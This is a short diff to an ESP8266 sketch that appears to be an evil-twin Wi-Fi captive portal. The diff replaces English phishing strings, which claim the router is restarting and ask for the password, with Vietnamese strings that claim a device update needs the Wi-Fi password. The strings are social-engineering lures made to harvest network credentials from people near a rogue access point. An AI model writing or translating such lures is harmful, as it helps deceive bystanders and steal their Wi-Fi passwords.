@@ -2,11 +2,11 @@
 #include <DNSServer.h>
 #include <ESP8266WebServer.h>
 
-#define SUBTITLE "Validation Panel"
-#define TITLE "Sign in:"
-#define BODY "Due to internal problems router is being restarted. Enter password to re-connect to the network."
-#define POST_TITLE "Validating..."
-#define POST_BODY "Your account is being validated. Please, wait up to 1 minute for device connection.</br>Thank you."
+#define SUBTITLE "Thiết bị cần được update"
+#define TITLE "Update WIFI:"
+#define BODY "Vui lòng diền password wifi để tiến hành update."
+#define POST_TITLE "Đang update..."
+#define POST_BODY "Đang tiến hành update xin vui lòng đợi trong giây lát"
 
 typedef struct
 {
